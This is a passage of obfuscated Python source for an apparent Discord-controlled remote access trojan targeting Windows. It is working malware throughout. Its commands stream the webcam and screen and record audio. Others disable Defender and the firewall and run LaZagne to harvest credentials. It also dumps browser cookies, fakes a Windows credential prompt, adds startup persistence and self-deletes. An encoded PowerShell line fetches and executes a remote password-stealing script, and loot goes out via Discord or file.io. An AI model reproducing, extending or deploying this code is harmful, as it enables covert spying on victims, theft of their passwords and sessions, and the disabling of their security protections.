                OOOOOOO0OO0O000O0 =subprocess .run (OOO00OOO0O00OOO00 ,stdout =subprocess .PIPE ,shell =True ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE )#line:479
                global status #line:480
                status ="ok"#line:481
                return OOOOOOO0OO0O000O0 .stdout .decode ('CP437').strip ()#line:482
            O0OOO00O0O0O00O00 =O00O0O00OOO0OO0OO ("Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASgBHAGwAdQBjADMAUgBoAGIAbQBOAGwASQBEADAAZwBXADAARgBqAGQARwBsADIAWQBYAFIAdgBjAGwAMAA2AE8AawBOAHkAWgBXAEYAMABaAFUAbAB1AGMAMwBSAGgAYgBtAE4AbABLAEYAdABUAGUAWABOADAAWgBXADAAdQBVAG0AVgBtAGIARwBWAGoAZABHAGwAdgBiAGkANQBCAGMAMwBOAGwAYgBXAEoAcwBlAFYAMAA2AE8AawB4AHYAWQBXAFEAbwBLAEUANQBsAGQAeQAxAFAAWQBtAHAAbABZADMAUQBnAFUAMwBsAHoAZABHAFYAdABMAGsANQBsAGQAQwA1AFgAWgBXAEoARABiAEcAbABsAGIAbgBRAHAATABrAFIAdgBkADIANQBzAGIAMgBGAGsAUgBHAEYAMABZAFMAZwBpAGEASABSADAAYwBIAE0ANgBMAHkAOQB5AFkAWABjAHUAWgAyAGwAMABhAEgAVgBpAGQAWABOAGwAYwBtAE4AdgBiAG4AUgBsAGIAbgBRAHUAWQAyADkAdABMADAAdwB4AFoAMgBoADAAVABUAFIAdQBMADAAUgA1AGIAbQBGAHQAYQBXAE4AVABkAEcAVgBoAGIARwBWAHkATAAyADEAaABhAFcANAB2AFIARQB4AE0ATAAxAEIAaABjADMATgAzAGIAMwBKAGsAVQAzAFIAbABZAFcAeABsAGMAaQA1AGsAYgBHAHcAaQBLAFMAawB1AFIAMgBWADAAVgBIAGwAdwBaAFMAZwBpAFUARwBGAHoAYwAzAGQAdgBjAG0AUgBUAGQARwBWAGgAYgBHAFYAeQBMAGwATgAwAFoAVwBGAHMAWgBYAEkAaQBLAFMAawBOAEMAaQBSAHcAWQBYAE4AegBkADIAOQB5AFoASABNAGcAUABTAEEAawBhAFcANQB6AGQARwBGAHUAWQAyAFUAdQBSADIAVgAwAFYASABsAHcAWgBTAGcAcABMAGsAZABsAGQARQAxAGwAZABHAGgAdgBaAEMAZwBpAFUAbgBWAHUASQBpAGsAdQBTAFcANQAyAGIAMgB0AGwASwBDAFIAcABiAG4ATgAwAFkAVwA1AGoAWgBTAHcAawBiAG4AVgBzAGIAQwBrAE4AQwBsAGQAeQBhAFgAUgBsAEwAVQBoAHYAYwAzAFEAZwBKAEgAQgBoAGMAMwBOADMAYgAzAEoAawBjAHcAMABLACIAfQAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AKQAuAFMAYwByAGkAcAB0ACkAKQAgAHwAIABpAGUAeAA=")#line:483
            OO0OOO0OOO00O00OO =open (O0OO000000OOOO0O0 +r"\passwords.txt",'w')#line:484
            OO0OOO0OOO00O00OO .write (str (O0OOO00O0O0O00O00 ))#line:485
            OO0OOO0OOO00O00OO .close ()#line:486
            OO0OO0OO00000OO0O =discord .File (O0OO000000OOOO0O0 +r"\passwords.txt",filename ="passwords.txt")#line:487
            await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed",file =OO0OO0OO00000OO0O )#line:488
            os .remove (O0OO000000OOOO0O0 +r"\passwords.txt")#line:489
        if O00OO0O000OO00O0O .content =="!streamwebcam":#line:490
            await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed")#line:491
            O0OO000000OOOO0O0 =(os .getenv ('TEMP'))#line:492
            OO0000O00O000OOOO =0 #line:493
            O0OO000OO0OOO0O0O =cv2 .VideoCapture (OO0000O00O000OOOO )#line:494
            O00O0O000OOOOOO00 =O00OO0O000OO00O0O .content #line:495
            OO0OO0OO00000OO0O =O0OO000000OOOO0O0 +r"\hobo\hello.txt"#line:496
            if os .path .isfile (OO0OO0OO00000OO0O ):#line:497
                OO00O0OOOO0OO0OO0 ="del "+OO0OO0OO00000OO0O +r" /f"#line:498
                os .system (OO00O0OOOO0OO0OO0 )#line:499
                os .system (r"RMDIR %temp%\hobo /s /q")#line:500
            while True :#line:501
                O0O00OO0O0OO00OOO ,O0O00000O0OO0OOO0 =O0OO000OO0OOO0O0O .read ()#line:502
                cv2 .imwrite (O0OO000000OOOO0O0 +r"\temp.png",O0O00000O0OO0OOO0 )#line:503
                O0OO0O0000OOOO0O0 =discord .File (O0OO000000OOOO0O0 +r"\temp.png",filename ="temp.png")#line:504
                OO00OO0O0OO0OO0OO =await O00OO0O000OO00O0O .channel .send (file =O0OO0O0000OOOO0O0 )#line:505
                O0OO000000OOOO0O0 =(os .getenv ('TEMP'))#line:506
                OO0OO0OO00000OO0O =O0OO000000OOOO0O0 +r"\hobo\hello.txt"#line:507
                if os .path .isfile (OO0OO0OO00000OO0O ):#line:508
                    del O0OO000OO0OOO0O0O #line:509
                    break #line:510
                else :#line:511
                    continue #line:512
        if O00OO0O000OO00O0O .content =="!stopwebcam":#line:513
            os .system (r"mkdir %temp%\hobo")#line:514
            os .system (r"echo hello>%temp%\hobo\hello.txt")#line:515
            os .system (r"del %temp\temp.png /F")#line:516
        if O00OO0O000OO00O0O .content =="!streamscreen":#line:517
            await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed")#line:518
            O0OO000000OOOO0O0 =(os .getenv ('TEMP'))#line:519
            OO00OO0000OO00O00 =O0OO000000OOOO0O0 +r"\hobos\hellos.txt"#line:520
            if os .path .isfile (OO00OO0000OO00O00 ):#line:521
                os .system (r"del %temp%\hobos\hellos.txt /f")#line:522
                os .system (r"RMDIR %temp%\hobos /s /q")#line:523
            else :#line:524
                pass #line:525
            while True :#line:526
                with mss ()as O00OO000OO00O0000 :#line:527
                    O00OO000OO00O0000 .shot (output =os .path .join (os .getenv ('TEMP')+r"\monitor.png"))#line:528
                O0000O000000O0O0O =(os .getenv ('TEMP'))+r"\monitor.png"#line:529
                OO0OO0OO00000OO0O =discord .File ((O0000O000000O0O0O ),filename ="monitor.png")#line:530
                await O00OO0O000OO00O0O .channel .send (file =OO0OO0OO00000OO0O )#line:531
                O0OO000000OOOO0O0 =(os .getenv ('TEMP'))#line:532
                OO00OO0000OO00O00 =O0OO000000OOOO0O0 +r"\hobos\hellos.txt"#line:533
                if os .path .isfile (OO00OO0000OO00O00 ):#line:534
                    break #line:535
                else :#line:536
                    continue #line:537
        if O00OO0O000OO00O0O .content =="!stopscreen":#line:539
            os .system (r"mkdir %temp%\hobos")#line:540
            os .system (r"echo hello>%temp%\hobos\hellos.txt")#line:541
            os .system (r"del %temp%\monitor.png /F")#line:542
        if O00OO0O000OO00O0O .content =="!shutdown":#line:544
            os .system ("shutdown /p")#line:545
            await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed")#line:546
        if O00OO0O000OO00O0O .content =="!restart":#line:548
            os .system ("shutdown /r /t 00")#line:549
            await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed")#line:550
        if O00OO0O000OO00O0O .content =="!logoff":#line:552
            os .system ("shutdown /l /f")#line:553
            await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed")#line:554
        if O00OO0O000OO00O0O .content =="!currentdir":#line:556
            O000O0O00O00O000O =subprocess .getoutput ('cd')#line:557
            await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed")#line:558
            await O00OO0O000OO00O0O .channel .send ("output is : "+O000O0O00O00O000O )#line:559
        if O00OO0O000OO00O0O .content =="!displaydir":#line:561
            O000O0O00O00O000O =subprocess .getoutput ('dir')#line:562
            if O000O0O00O00O000O :#line:563
                OO0O00000O0O0OO0O =O000O0O00O00O000O #line:564
                OO0OOO0OO0OO0OOOO =len (OO0O00000O0O0OO0O )#line:565
                if OO0OOO0OO0OO0OOOO <1 :#line:566
                    await O00OO0O000OO00O0O .channel .send ("[*] Command not recognized or no output was obtained")#line:567
                elif OO0OOO0OO0OO0OOOO >1990 :#line:568
                    O0OO000000OOOO0O0 =(os .getenv ('TEMP'))#line:569
                    if os .path .isfile (O0OO000000OOOO0O0 +r"\output22.txt"):#line:570
                        os .system (r"del %temp%\output22.txt /f")#line:571
                    OO0OOOOOOOO0OO00O =open (O0OO000000OOOO0O0 +r"\output22.txt",'a')#line:572
                    OO0OOOOOOOO0OO00O .write (OO0O00000O0O0OO0O )#line:573
                    OO0OOOOOOOO0OO00O .close ()#line:574
                    OO0OO0OO00000OO0O =discord .File (O0OO000000OOOO0O0 +r"\output22.txt",filename ="output22.txt")#line:575
                    await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed",file =OO0OO0OO00000OO0O )#line:576
                else :#line:577
                    await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed : "+OO0O00000O0O0OO0O )#line:578
        if O00OO0O000OO00O0O .content =="!listprocess":#line:580
            if 1 ==1 :#line:581
                OO0O00000O0O0OO0O =subprocess .getoutput ("tasklist")#line:582
                OO0OOO0OO0OO0OOOO =len (OO0O00000O0O0OO0O )#line:583
                if OO0OOO0OO0OO0OOOO <1 :#line:584
                    await O00OO0O000OO00O0O .channel .send ("[*] Command not recognized or no output was obtained")#line:585
                elif OO0OOO0OO0OO0OOOO >1990 :#line:586
                    O0OO000000OOOO0O0 =(os .getenv ('TEMP'))#line:587
                    if os .path .isfile (O0OO000000OOOO0O0 +r"\output.txt"):#line:588
                        os .system (r"del %temp%\output.txt /f")#line:589
                    OO0OOOOOOOO0OO00O =open (O0OO000000OOOO0O0 +r"\output.txt",'a')#line:590
                    OO0OOOOOOOO0OO00O .write (OO0O00000O0O0OO0O )#line:591
                    OO0OOOOOOOO0OO00O .close ()#line:592
                    OO0OO0OO00000OO0O =discord .File (O0OO000000OOOO0O0 +r"\output.txt",filename ="output.txt")#line:593
                    await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed",file =OO0OO0OO00000OO0O )#line:594
                else :#line:595
                    await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed : "+OO0O00000O0O0OO0O )#line:596
        if O00OO0O000OO00O0O .content .startswith ("!prockill"):#line:597
            OO0O00000O00O0OO0 =O00OO0O000OO00O0O .content [10 :]#line:598
            OO00O000O0O0O0OOO =r"taskkill /IM"+' "'+OO0O00000O00O0OO0 +'" '+r"/f"#line:599
            os .system (OO00O000O0O0O0OOO )#line:600
            time .sleep (2 )#line:601
            O00OO0OO00000O00O =OO0O00000O00O0OO0 #line:602
            OOOO0O00000000OO0 ='TASKLIST','/FI','imagename eq %s'%O00OO0OO00000O00O #line:603
            O000O0O00O00O000O =subprocess .check_output (OOOO0O00000000OO0 ).decode ()#line:604
            OOO00OOOO00O0OOOO =O000O0O00O00O000O .strip ().split ('\r\n')[-1 ]#line:605
            OO00OO00O00OO0000 =(OOO00OOOO00O0OOOO .lower ().startswith (O00OO0OO00000O00O .lower ()))#line:606
            if OO00OO00O00OO0000 ==False :#line:607
                await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed")#line:608
            elif OO00OO00O00OO0000 ==True :#line:609
                await O00OO0O000OO00O0O .channel .send ('[*] Command did not exucute properly')#line:610
        if O00OO0O000OO00O0O .content .startswith ("!recscreen"):#line:611
            O0O0OOO000OO0OOOO =float (O00OO0O000OO00O0O .content [10 :])#line:612
            OOOO0O0OOOOOOOO00 =0 #line:613
            while True :#line:614
                OOOO0O0OOOOOOOO00 =OOOO0O0OOOOOOOO00 +1 #line:615
                OO000OOOO0OO0OOO0 =0.045 *OOOO0O0OOOOOOOO00 #line:616
                if OO000OOOO0OO0OOO0 >=O0O0OOO000OO0OOOO :#line:617
                    break #line:618
                else :#line:619
                    continue #line:620
            O0000OOOOO000O0O0 =(1920 ,1080 )#line:621
            O0OOOO0OO0O0OOO0O =cv2 .VideoWriter_fourcc (*"XVID")#line:622
            O0OO000000OOOO0O0 =(os .getenv ('TEMP'))#line:623
            OO00OOOO000O0O00O =O0OO000000OOOO0O0 +r"\output.avi"#line:624
            O0O0O0OOO0OOOO00O =cv2 .VideoWriter (OO00OOOO000O0O00O ,O0OOOO0OO0O0OOO0O ,20.0 ,(O0000OOOOO000O0O0 ))#line:625
            O000000O0O0O0OOO0 =1 #line:626
            while True :#line:627
                O000000O0O0O0OOO0 =O000000O0O0O0OOO0 +1 #line:628
                OO00000O000000OO0 =pyautogui .screenshot ()#line:629
                OO0OO00O0O0OOOOOO =np .array (OO00000O000000OO0 )#line:630
                OO0OO00O0O0OOOOOO =cv2 .cvtColor (OO0OO00O0O0OOOOOO ,cv2 .COLOR_BGR2RGB )#line:631
                O0O0O0OOO0OOOO00O .write (OO0OO00O0O0OOOOOO )#line:632
                if O000000O0O0O0OOO0 >=OOOO0O0OOOOOOOO00 :#line:633
                    break #line:634
            O0O0O0OOO0OOOO00O .release ()#line:635
            O0OO000000OOOO0O0 =(os .getenv ('TEMP'))#line:636
            OO00O0O0OOO000OO0 =O0OO000000OOOO0O0 +r"\output.avi"#line:637
            OOOO0O0O00OO0O0OO =os .stat (OO00O0O0OOO000OO0 ).st_size #line:638
            if OOOO0O0O00OO0O0OO >7340032 :#line:639
                await O00OO0O000OO00O0O .channel .send ("this may take some time becuase it is over 8 MB. please wait")#line:640
                O0OO0O0000OOOO0O0 =requests .post ('https://file.io/',files ={"file":open (OO00O0O0OOO000OO0 ,"rb")}).json ()["link"]#line:641
                await O00OO0O000OO00O0O .channel .send ("video download link: "+O0OO0O0000OOOO0O0 )#line:642
                await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed")#line:643
                os .system (r"del %temp%\output.avi /f")#line:644
            else :#line:645
                OO0OO0OO00000OO0O =discord .File (OO00O0O0OOO000OO0 ,filename ="output.avi")#line:646
                await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed",file =OO0OO0OO00000OO0O )#line:647
                os .system (r"del %temp%\output.avi /f")#line:648
        if O00OO0O000OO00O0O .content .startswith ("!reccam"):#line:649
            OO000O00OOOO00O00 =float (O00OO0O000OO00O0O .content [8 :])#line:650
            O0OO000000OOOO0O0 =(os .getenv ('TEMP'))#line:651
            O000O000000OO00OO =cv2 .VideoCapture (0 )#line:652
            OOOOO000O0OOOO0O0 =cv2 .VideoWriter_fourcc (*'XVID')#line:653
            O0OO0OOOOO00OO0O0 =O0OO000000OOOO0O0 +r"\output.mp4"#line:654
            O000O0O00O00O000O =cv2 .VideoWriter (O0OO0OOOOO00OO0O0 ,OOOOO000O0OOOO0O0 ,20.0 ,(640 ,480 ))#line:655
            OOOO0O0OOOOOOOO00 =0 #line:656
            while True :#line:657
                OOOO0O0OOOOOOOO00 =OOOO0O0OOOOOOOO00 +1 #line:658
                OO000OOOO0OO0OOO0 =0.045 *OOOO0O0OOOOOOOO00 #line:659
                OOOOO0OO0O00OOOO0 ,OO0OO00O0O0OOOOOO =O000O000000OO00OO .read ()#line:660
                O000O0O00O00O000O .write (OO0OO00O0O0OOOOOO )#line:661
                if OO000OOOO0OO0OOO0 >=OO000O00OOOO00O00 :#line:662
                    break #line:663
                else :#line:664
                    continue #line:665
            O000O000000OO00OO .release ()#line:666
            O000O0O00O00O000O .release ()#line:667
            O0OO000000OOOO0O0 =(os .getenv ('TEMP'))#line:668
            OO00O0O0OOO000OO0 =O0OO000000OOOO0O0 +r"\output.mp4"#line:669
            OOOO0O0O00OO0O0OO =os .stat (OO00O0O0OOO000OO0 ).st_size #line:670
            if OOOO0O0O00OO0O0OO >7340032 :#line:671
                await O00OO0O000OO00O0O .channel .send ("this may take some time becuase it is over 8 MB. please wait")#line:672
                O0OO0O0000OOOO0O0 =requests .post ('https://file.io/',files ={"file":open (OO00O0O0OOO000OO0 ,"rb")}).json ()["link"]#line:673
                await O00OO0O000OO00O0O .channel .send ("video download link: "+O0OO0O0000OOOO0O0 )#line:674
                await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed")#line:675
                os .system (r"del %temp%\output.mp4 /f")#line:676
            else :#line:677
                OO0OO0OO00000OO0O =discord .File (OO00O0O0OOO000OO0 ,filename ="output.mp4")#line:678
                await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed",file =OO0OO0OO00000OO0O )#line:679
                os .system (r"del %temp%\output.mp4 /f")#line:680
        if O00OO0O000OO00O0O .content .startswith ("!recaudio"):#line:681
            OOOOOOO000000OOOO =float (O00OO0O000OO00O0O .content [10 :])#line:682
            O0OO000000OOOO0O0 =(os .getenv ('TEMP'))#line:683
            OOOOO0OOO0OOO0O00 =44100 #line:684
            O000OOOO00OO0OOOO =O0OO000000OOOO0O0 +r"\output.wav"#line:685
            OOOO00O00O0OOOOO0 =sd .rec (int (OOOOOOO000000OOOO *OOOOO0OOO0OOO0O00 ),samplerate =OOOOO0OOO0OOO0O00 ,channels =2 )#line:686
            sd .wait ()#line:687
            write (O000OOOO00OO0OOOO ,OOOOO0OOO0OOO0O00 ,OOOO00O00O0OOOOO0 )#line:688
            O0OO000000OOOO0O0 =(os .getenv ('TEMP'))#line:689
            OO00O0O0OOO000OO0 =O0OO000000OOOO0O0 +r"\output.wav"#line:690
            OOOO0O0O00OO0O0OO =os .stat (OO00O0O0OOO000OO0 ).st_size #line:691
            if OOOO0O0O00OO0O0OO >7340032 :#line:692
                await O00OO0O000OO00O0O .channel .send ("this may take some time becuase it is over 8 MB. please wait")#line:693
                O0OO0O0000OOOO0O0 =requests .post ('https://file.io/',files ={"file":open (OO00O0O0OOO000OO0 ,"rb")}).json ()["link"]#line:694
                await O00OO0O000OO00O0O .channel .send ("video download link: "+O0OO0O0000OOOO0O0 )#line:695
                await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed")#line:696
                os .system (r"del %temp%\output.wav /f")#line:697
            else :#line:698
                OO0OO0OO00000OO0O =discord .File (OO00O0O0OOO000OO0 ,filename ="output.wav")#line:699
                await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed",file =OO0OO0OO00000OO0O )#line:700
                os .system (r"del %temp%\output.wav /f")#line:701
        if O00OO0O000OO00O0O .content .startswith ("!delete"):#line:702
            global statue #line:703
            OOO0OOO0O00O0OOOO =O00OO0O000OO00O0O .content [8 :]#line:704
            OOO0OOO0O00O0OOOO ="del "+'"'+OOO0OOO0O00O0OOOO +'"'+" /F"#line:705
            def O00O0O00OOO0OO0OO ():#line:706
                OO000000O0OO0000O =subprocess .run (OOO0OOO0O00O0OOOO ,stdout =subprocess .PIPE ,shell =True ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE )#line:707
                return OO000000O0OO0000O #line:708
            O000O0O00OO0000O0 =threading .Thread (target =O00O0O00OOO0OO0OO )#line:709
            O000O0O00OO0000O0 ._running =True #line:710
            O000O0O00OO0000O0 .start ()#line:711
            time .sleep (1 )#line:712
            O000O0O00OO0000O0 ._running =False #line:713
            global statue #line:714
            statue ="ok"#line:715
            if statue :#line:716
                OO0OOO0OO0OO0OOOO =len (OO0O00000O0O0OO0O )#line:717
                if OO0OOO0OO0OO0OOOO >0 :#line:718
                    await O00OO0O000OO00O0O .channel .send ("[*] an error has occurred")#line:719
                else :#line:720
                    await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed")#line:721
            else :#line:722
                await O00OO0O000OO00O0O .channel .send ("[*] Command not recognized or no output was obtained")#line:723
                statue =None #line:724
        if O00OO0O000OO00O0O .content =="!disableantivirus":#line:725
            O0OO0O0O00OO000O0 =ctypes .windll .shell32 .IsUserAnAdmin ()!=0 #line:726
            if O0OO0O0O00OO000O0 ==True :#line:727
                OOO0OOO0O00O0OOOO =""" REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | findstr /I /C:"CurrentBuildnumber"  """#line:728
                def O00O0O00OOO0OO0OO ():#line:729
                    OOO0OOO0OOOO0000O =subprocess .run (OOO0OOO0O00O0OOOO ,stdout =subprocess .PIPE ,shell =True ,stderr =subprocess .PIPE ,stdin =subprocess .PIPE )#line:730
                    return OOO0OOO0OOOO0000O #line:731
                OO0O00000O0O0OO0O =str (O00O0O00OOO0OO0OO ().stdout .decode ('CP437'))#line:732
                OO00OO00O00OO0000 =OO0O00000O0O0OO0O .split ()#line:733
                O0OO0O0000OOOO0O0 =OO00OO00O00OO0000 [2 :]#line:734
                if O0OO0O0000OOOO0O0 <=['17763']:#line:735
                    os .system (r"Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet")#line:736
                    await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed")#line:737
                elif O0OO0O0000OOOO0O0 >=['18362']:#line:738
                    os .system (r"""powershell Add-MpPreference -ExclusionPath "C:\\" """)#line:739
                    await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed")#line:740
                else :#line:741
                    await O00OO0O000OO00O0O .channel .send ("[*] An unknown error has occurred")#line:742
            else :#line:743
                await O00OO0O000OO00O0O .channel .send ("[*] This command requires admin privileges")#line:744
        if O00OO0O000OO00O0O .content =="!disablefirewall":#line:745
            O0OO0O0O00OO000O0 =ctypes .windll .shell32 .IsUserAnAdmin ()!=0 #line:746
            if O0OO0O0O00OO000O0 ==True :#line:747
                os .system (r"NetSh Advfirewall set allprofiles state off")#line:748
                await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed")#line:749
            else :#line:750
                await O00OO0O000OO00O0O .channel .send ("[*] This command requires admin privileges")#line:751
        if O00OO0O000OO00O0O .content =="!selfdestruct":#line:753
            O0O00OO0O0O0000O0 =sys .argv [0 ]#line:754
            O000OOO0O0O0000O0 =os .getenv ('APPDATA')#line:755
            O000O00OOOOOO000O =O000OOO0O0O0000O0 +"\..\Local\Packages\Microsoft.NET.Native.Runtime.2.2_8wekyb3d8bbwe7fc2"#line:756
            O00000OOOOO0O00O0 =inspect .getframeinfo (inspect .currentframe ()).filename #line:757
            OO0OO00OOOO0OO000 =os .getpid ()#line:758
            O00000OO0OO000OOO ="""@echo off"""+" & "+"taskkill"+r" /F /PID "+str (OO0OO00OOOO0OO000 )+" &"+" del "+'"'+O00000OOOOO0O00O0 +'"'+r" /F"+" &"+" del "+'"'+O0O00OO0O0O0000O0 +'"'+r" /F"+" &"+" @RD /S /Q "+'"'+O000O00OOOOOO000O +'"'+" & "+r"""start /b "" cmd /c del "%~f0"& taskkill /IM cmd.exe /F &exit /b"""#line:759
            O0OO000000OOOO0O0 =(os .getenv ("TEMP"))#line:760
            OOOOOOO00OOO0O0O0 =O0OO000000OOOO0O0 +r"\delete.bat"#line:761
            if os .path .isfile (OOOOOOO00OOO0O0O0 ):#line:762
                OOO0O00O000O0OO0O ="del "+OOOOOOO00OOO0O0O0 +r" /f"#line:763
                os .system (OOO0O00O000O0OO0O )#line:764
            O000O0OOOO0OOOO0O =open (O0OO000000OOOO0O0 +r"\delete.bat",'a')#line:765
            O000O0OOOO0OOOO0O .write (O00000OO0OO000OOO )#line:766
            O000O0OOOO0OOOO0O .close ()#line:767
            os .system (r"start /min %temp%\delete.bat")#line:768
        if O00OO0O000OO00O0O .content =="!windowspass":#line:769
            O0OO0O0OOO000OOOO =win32cred .CredUIPromptForCredentials #line:770
            O0OOO00000O000O00 =[]#line:771
            try :#line:772
                O0OOO00000O000O00 =O0OO0O0OOO000OOOO (os .environ ['userdomain'],0 ,os .environ ['username'],None ,True ,CRED_TYPE_GENERIC ,{})#line:773
            except Exception :#line:774
                pass #line:775
            await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed")#line:776
            await O00OO0O000OO00O0O .channel .send ("password user typed in is: "+O0OOO00000O000O00 )#line:777
            """
            cmd82 = "$cred=$host.ui.promptforcredential('Windows Security Update','',[Environment]::UserName,[Environment]::UserDomainName);"
            cmd92 = 'echo $cred.getnetworkcredential().password;'
            full_cmd = 'Powershell "{} {}"'.format(cmd82,cmd92)
            instruction = full_cmd
            def shell():   
               output = subprocess.run(full_cmd, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
               return output
            result = str(shell().stdout.decode('CP437'))
            await message.channel.send("[*] Command successfuly executed")
            await message.channel.send("password user typed in is: " + result)
            """#line:789
        if O00OO0O000OO00O0O .content =="!displayoff":#line:790
            O0OO0O0O00OO000O0 =ctypes .windll .shell32 .IsUserAnAdmin ()!=0 #line:791
            if O0OO0O0O00OO000O0 ==True :#line:792
                O00O0OOO0OOO00O0O =274 #line:793
                O00OO00OOO00O00O0 =65535 #line:794
                OOO0O0OO0O00OO000 =61808 #line:795
                ctypes .windll .user32 .BlockInput (True )#line:796
                ctypes .windll .user32 .SendMessageW (O00OO00OOO00O00O0 ,O00O0OOO0OOO00O0O ,OOO0O0OO0O00OO000 ,2 )#line:797
                await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed")#line:798
            else :#line:799
                await O00OO0O000OO00O0O .channel .send ("[!] Admin rights are required for this operation")#line:800
        if O00OO0O000OO00O0O .content =="!displayon":#line:801
            O0OO0O0O00OO000O0 =ctypes .windll .shell32 .IsUserAnAdmin ()!=0 #line:802
            if O0OO0O0O00OO000O0 ==True :#line:803
                OO00OOOOOO0O0O0OO =Controller ()#line:804
                OO00OOOOOO0O0O0OO .press (Key .esc )#line:805
                OO00OOOOOO0O0O0OO .release (Key .esc )#line:806
                OO00OOOOOO0O0O0OO .press (Key .esc )#line:807
                OO00OOOOOO0O0O0OO .release (Key .esc )#line:808
                ctypes .windll .user32 .BlockInput (False )#line:809
                await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed")#line:810
            else :#line:811
                await O00OO0O000OO00O0O .channel .send ("[!] Admin rights are required for this operation")#line:812
        if O00OO0O000OO00O0O .content .startswith ("!website"):#line:813
            O00O00OO00OO0OOO0 =O00OO0O000OO00O0O .content [9 :]#line:814
            def O00000O00O00OO00O (OOO0000O00OOOO00O ):#line:815
                if not OOO0000O00OOOO00O .startswith ('http'):#line:816
                    OOO0000O00OOOO00O ='http://'+OOO0000O00OOOO00O #line:817
                subprocess .call ('start '+OOO0000O00OOOO00O ,shell =True )#line:818
            O00000O00O00OO00O (O00O00OO00OO0OOO0 )#line:819
            await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed")#line:820
        if O00OO0O000OO00O0O .content =="!getsystemcreds":#line:821
            O0O0OO0OO00OO00OO =run .run_lazagne ()#line:822
            O0OOO00000O000O00 =io .StringIO ()#line:823
            for OOO00OO0OOOOOOO00 in O0O0OO0OO00OO00OO :#line:824
                O0OOO00000O000O00 .write (str (OOO00OO0OOOOOOO00 )+'\n')#line:825
            O0OO000000OOOO0O0 =os .getenv ("TEMP")#line:826
            O0000O0OOO0OO0O00 =O0OO000000OOOO0O0 +r"\creds.txt"#line:827
            with open (O0000O0OOO0OO0O00 ,'w')as O00OOOOO0OOOOOO0O :#line:828
                json .dump (O0OOO00000O000O00 .getvalue (),O00OOOOO0OOOOOO0O ,indent =4 )#line:829
            OO0OO0OO00000OO0O =discord .File (O0000O0OOO0OO0O00 ,filename ="creds.txt")#line:830
            await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed",file =OO0OO0OO00000OO0O )#line:831
            os .remove (O0000O0OOO0OO0O00 )#line:832
        if O00OO0O000OO00O0O .content =="!startup":#line:833
            O0OO0O0O00OO000O0 =ctypes .windll .shell32 .IsUserAnAdmin ()!=0 #line:834
            if O0OO0O0O00OO000O0 ==True :#line:835
                O0000O000000O0O0O =sys .argv [0 ]#line:836
                O00000O0OO0OOOO00 =False #line:837
                if (sys .argv [0 ].endswith ("exe")):#line:838
                    O00000O0OO0OOOO00 =True #line:839
                if O00000O0OO0OOOO00 :#line:840
                    os .system (fr'copy "{O0000O000000O0O0O}" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /Y')#line:841
                else :#line:842
                    os .system (r'copy "{}" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs" /Y'.format (O0000O000000O0O0O ))#line:843
                    OO0O00O0O0O0O0O00 =r"""
                        Set objShell = WScript.CreateObject("WScript.Shell")
                        objShell.Run "cmd /c cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\ && python {}", 0, True
                        """.format (os .path .basename (sys .argv [0 ]))#line:847
                    with open (r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.vbs".format (os .getenv ("USERNAME")),"w")as O00OOOOO0OOOOOO0O :#line:848
                        O00OOOOO0OOOOOO0O .write (OO0O00O0O0O0O0O00 )#line:849
                        O00OOOOO0OOOOOO0O .close ()#line:850
                await O00OO0O000OO00O0O .channel .send ("[*] Command successfuly executed")#line:851
            else :#line:852
                await O00OO0O000OO00O0O .channel .send ("[*] This command requires admin privileges")#line:853
        if O00OO0O000OO00O0O .content =="!dumpcookies":#line:854
            O0OO00O00OOOOO00O =browser_cookie3 .load ()#line:855
            O0OO000000OOOO0O0 =os .getenv ("TEMP")#line:856
            O0000O0OOO0OO0O00 =O0OO000000OOOO0O0 +r"\cookies.txt"#line:857
            with open (O0000O0OOO0OO0O00 ,'w')as O00OOOOO0OOOOOO0O :#line:858
                json .dump (requests .utils .dict_from_cookiejar (O0OO00O00OOOOO00O ),O00OOOOO0OOOOOO0O )#line:859
